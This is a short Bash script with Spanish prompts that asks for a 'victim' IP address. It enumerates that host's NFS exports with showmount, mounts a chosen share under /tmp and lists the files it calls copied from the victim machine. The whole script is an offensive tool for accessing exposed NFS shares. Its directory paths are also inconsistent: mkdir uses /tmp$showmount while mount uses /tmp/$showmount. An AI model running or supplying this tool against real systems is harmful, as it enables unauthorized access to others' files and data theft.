#!/bin/bash

echo ""
echo -e "	\e[33mIngrese la IP Victima	\e[0m"
echo ""
read ip
echo ""

showmount -e $ip
echo ""
echo -e "	\e[33mIngrese el Valor de Showmouont	\e[0m"
echo ""
read showmount
echo ""

mkdir /tmp$showmount
echo ""
mount -t nfs $ip:$showmount /tmp/$showmount
echo ""

df -k
echo ""

echo ""
echo -e "  	\e[33mEsto se copio de la Maquina Victima $showmount vaya a la ruta /tmp$showmount \e[0m"
echo -e "	\e[33ma continuacion se ve la informacion copiada.	\e[0m"
echo ""

ls /tmp$showmount
echo ""
